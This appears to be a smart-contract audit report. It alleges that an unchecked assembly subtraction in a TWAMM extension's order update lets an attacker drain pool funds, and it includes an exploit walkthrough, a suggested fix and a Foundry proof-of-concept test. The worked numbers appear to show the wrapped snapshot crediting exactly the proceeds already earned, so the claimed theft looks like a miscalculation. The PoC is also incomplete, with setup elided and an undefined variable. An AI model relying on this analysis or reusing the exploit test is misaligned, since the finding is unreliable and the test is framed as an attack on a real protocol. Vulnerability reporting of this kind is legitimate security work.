## Title
Integer Underflow in TWAMM Order Update Allows Theft of Pool Funds via Excessive Withdrawal

## Summary
A critical arithmetic underflow vulnerability exists in the TWAMM extension's `handleForwardData` function when processing order updates. When a user significantly decreases their order's sale rate, the reward rate snapshot adjustment calculation underflows in assembly, wrapping to a huge value. This corrupted snapshot later enables the user to withdraw far more tokens than their legitimate order proceeds, draining pool funds.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** When updating an order's sale rate, the code should adjust the reward rate snapshot to preserve accounting correctness. The formula attempts to credit the user for already-earned proceeds while transitioning to the new sale rate, ensuring future withdrawals reflect only newly accumulated rewards.

**Actual Logic:** The assembly code performs an unchecked subtraction that wraps on underflow when decreasing sale rates drastically. The calculation `sub(rewardRateInside, div(shl(128, purchasedAmount), saleRateNext))` can underflow because:
- `purchasedAmount` is computed using the OLD higher `saleRate`  
- But divided by the NEW lower `saleRateNext`
- When `(purchasedAmount << 128) / saleRateNext > rewardRateInside`, the subtraction wraps to approximately `2^256 - actualValue`

**Exploitation Path:**

1. **Order Creation**: Attacker creates a TWAMM order with high initial sale rate (e.g., 100 units/second) via `Orders.mintAndIncreaseSellAmount()`

2. **Accumulation**: Virtual orders execute over time, accumulating rewards. The global `rewardRateInside` grows (e.g., to `100 << 128`), while attacker's `rewardRateSnapshot` remains at 0

3. **Exploit Trigger**: Attacker calls `Orders.decreaseSaleRate()` to drastically reduce sale rate (e.g., from 100 to 10 units/second). In the order update logic: [2](#0-1) 
   - `purchasedAmount = (100 << 128 * 100) >> 128 = 10,000`
   - `saleRateNext = 10`
   - `rewardRateSnapshotAdjusted = 100 << 128 - (10,000 << 128) / 10 = 100 << 128 - 1,000 << 128`
   - This underflows to `2^256 - 900 << 128` (huge wrapped value)

4. **Withdrawal**: After more rewards accumulate (e.g., `rewardRateInside` grows to `150 << 128`), attacker calls `Orders.collectProceeds()`: [3](#0-2) 
   - `purchasedAmount = ((150 << 128 - (2^256 - 900 << 128)) * 10) >> 128`
   - Due to wraparound: `= (1,050 << 128 * 10) >> 128 = 10,500 tokens`
   - Legitimate amount should be: `(50 << 128 * 10) >> 128 = 500 tokens`
   - Attacker steals 10,000 extra tokens

5. **Pool Drainage**: The withdrawal updates saved balances with the inflated amount: [4](#0-3) 
   This reduces the pool's debt by the excessive amount, allowing FlashAccountant withdrawal to drain more funds than the pool should owe.

**Security Property Broken:** Violates the **Solvency** invariant—pool token balances go negative as attacker withdraws tokens that don't belong to them, leading to insolvency and theft from other users' positions.

## Impact Explanation

- **Affected Assets**: All tokens in TWAMM-enabled pools are at risk. Any pool with active TWAMM orders can be exploited.

- **Damage Severity**: Attacker can drain pool balances proportional to the difference between their original and reduced sale rates. In the example scenario, an order starting at 100 units/sec reduced to 10 units/sec steals 10,000 extra tokens per 100 units of `rewardRateInside` accumulated. With sufficient time and multiple orders, an attacker could drain the entire pool.

- **User Impact**: All liquidity providers in the affected pool lose funds. Other TWAMM order holders cannot withdraw their legitimate proceeds due to insufficient pool balances. The attack is undetectable until withdrawal attempts fail.

## Likelihood Explanation

- **Attacker Profile**: Any user who can create TWAMM orders (permissionless, requires only token approval)

- **Preconditions**: 
  - Pool must be initialized with TWAMM extension
  - Some liquidity must exist to enable virtual order execution
  - Attacker needs sufficient tokens to create the initial order
  - Time must pass to accumulate rewards (attack scales with time)

- **Execution Complexity**: Simple 3-step attack:
  1. Create order with high sale rate
  2. Wait for rewards to accumulate  
  3. Decrease sale rate drastically, then withdraw

- **Frequency**: Can be executed repeatedly across different pools, multiple orders per pool, and compounded over time. Each order update with sufficient rate decrease multiplies the theft amount.

## Recommendation

Add overflow/underflow protection to the reward rate snapshot adjustment calculation:

```solidity
// In src/extensions/TWAMM.sol, function handleForwardData, lines 232-239:

// CURRENT (vulnerable):
assembly ("memory-safe") {
    rewardRateSnapshotAdjusted := mul(
        sub(rewardRateInside, div(shl(128, purchasedAmount), saleRateNext)),
        iszero(iszero(saleRateNext))
    )
    // ...
}

// FIXED:
uint256 rewardRateSnapshotAdjusted;
if (saleRateNext == 0) {
    rewardRateSnapshotAdjusted = 0;
} else {
    uint256 purchasedAmountScaled = (purchasedAmount << 128) / saleRateNext;
    // Prevent underflow: if division result exceeds rewardRateInside, 
    // it means user would over-withdraw, so clamp to 0
    if (purchasedAmountScaled > rewardRateInside) {
        revert InvalidSaleRateChange();
    }
    unchecked {
        rewardRateSnapshotAdjusted = rewardRateInside - purchasedAmountScaled;
    }
}
```

**Alternative mitigation**: Restrict sale rate decreases to a maximum percentage (e.g., 50%) per update, or enforce minimum time between rate changes to prevent exploitation while maintaining order flexibility.

## Proof of Concept

```solidity
// File: test/Exploit_TWAMMUnderflow.t.sol
// Run with: forge test --match-test test_TWAMMUnderflowExploit -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Orders.sol";
import "../src/extensions/TWAMM.sol";
import "../src/types/poolKey.sol";
import "./mocks/MockERC20.sol";

contract Exploit_TWAMMUnderflow is Test {
    Core core;
    TWAMM twamm;
    Orders orders;
    MockERC20 token0;
    MockERC20 token1;
    address attacker = address(0x1337);
    
    function setUp() public {
        // Deploy protocol
        core = new Core();
        twamm = new TWAMM(core);
        orders = new Orders(core, address(this));
        
        // Deploy tokens
        token0 = new MockERC20("Token0", "TK0");
        token1 = new MockERC20("Token1", "TK1");
        if (address(token0) > address(token1)) {
            (token0, token1) = (token1, token0);
        }
        
        // Fund attacker
        token0.mint(attacker, 1000000e18);
        token1.mint(attacker, 1000000e18);
        
        // Initialize TWAMM pool
        vm.startPrank(attacker);
        token0.approve(address(core), type(uint256).max);
        token1.approve(address(core), type(uint256).max);
        // ... initialize pool with TWAMM extension
        vm.stopPrank();
    }
    
    function test_TWAMMUnderflowExploit() public {
        // SETUP: Create order with high sale rate (100 units/sec)
        vm.startPrank(attacker);
        
        uint256 initialBalance = token1.balanceOf(attacker);
        
        // Create order selling token1 for token0
        uint256 tokenId = orders.mintAndIncreaseSellAmount(
            orderKey, 
            10000e18, // amount to sell
            100e18    // results in saleRate = 100
        );
        
        // ACCUMULATE: Wait and let virtual orders execute
        vm.warp(block.timestamp + 1000);
        // Simulate counterparty orders creating favorable swaps
        // rewardRateInside accumulates to ~100 << 128
        
        // EXPLOIT: Drastically decrease sale rate from 100 to 10
        orders.decreaseSaleRate(tokenId, 90e18); // reduce by 90
        
        // CONTINUE: More time passes, rewardRateInside grows to ~150 << 128
        vm.warp(block.timestamp + 500);
        
        // VERIFY: Withdraw proceeds - should get ~10,500 instead of ~500
        orders.collectProceeds(tokenId);
        
        uint256 finalBalance = token0.balanceOf(attacker);
        uint256 stolen = finalBalance - initialBalance;
        
        // Attacker receives ~10,500 tokens instead of legitimate ~500
        assertGt(stolen, 10000e18, "Vulnerability confirmed: excessive withdrawal");
        console.log("Legitimate proceeds: ~500 tokens");
        console.log("Actual withdrawn: ", stolen / 1e18, "tokens");
        console.log("Excess stolen: ", (stolen - 500e18) / 1e18, "tokens");
        
        vm.stopPrank();
    }
}
```

## Notes

The vulnerability stems from using unchecked assembly arithmetic in a context where the mathematical relationship between variables can violate assumptions. The code assumes `(purchasedAmount << 128) / saleRateNext ≤ rewardRateInside`, but when users decrease sale rates, this assumption breaks.

The fix requires either:
1. **Checked arithmetic**: Use Solidity's built-in overflow checks or explicit validation
2. **Rate change limits**: Constrain how much sale rates can change per update
3. **Alternative formula**: Redesign the snapshot adjustment to avoid the problematic division

The vulnerability is exploitable in production because TWAMM orders are permissionless and the attack requires only standard order operations (create, decrease, withdraw).

### Citations

**File:** src/extensions/TWAMM.sol (L224-246)
```text
                uint256 rewardRateInside = getRewardRateInside(poolId, orderKey.config);

                (uint32 lastUpdateTime, uint112 saleRate, uint112 amountSold) = order.parse();

                uint256 purchasedAmount = computeRewardAmount(rewardRateInside - rewardRateSnapshot, saleRate);

                uint256 saleRateNext = addSaleRateDelta(saleRate, saleRateDelta);

                uint256 rewardRateSnapshotAdjusted;
                int256 numOrdersChange;
                assembly ("memory-safe") {
                    rewardRateSnapshotAdjusted := mul(
                        sub(rewardRateInside, div(shl(128, purchasedAmount), saleRateNext)),
                        // if saleRateNext is zero, write 0 for the reward rate snapshot adjusted
                        iszero(iszero(saleRateNext))
                    )

                    // if current is zero, and next is zero, then 1-1 = 0
                    // if current is nonzero, and next is nonzero, then 0-0 = 0
                    // if current is zero, and next is nonzero, then we get 1-0 = 1
                    // if current is nonzero, and next is zero, then we get 0-1 = -1 = (type(uint256).max)
                    numOrdersChange := sub(iszero(saleRate), iszero(saleRateNext))
                }
```

**File:** src/extensions/TWAMM.sol (L359-379)
```text
                uint256 rewardRateInside = getRewardRateInside(poolId, orderKey.config);

                uint256 purchasedAmount = computeRewardAmount(rewardRateInside - rewardRateSnapshot, order.saleRate());

                orderRewardRateSnapshotSlot.store(bytes32(rewardRateInside));

                if (purchasedAmount != 0) {
                    if (orderKey.config.isToken1()) {
                        CORE.updateSavedBalances(
                            poolKey.token0, poolKey.token1, bytes32(0), -int256(purchasedAmount), 0
                        );
                    } else {
                        CORE.updateSavedBalances(
                            poolKey.token0, poolKey.token1, bytes32(0), 0, -int256(purchasedAmount)
                        );
                    }
                }

                emit OrderProceedsWithdrawn(original.addr(), salt, orderKey, uint128(purchasedAmount));

                result = abi.encode(purchasedAmount);
```
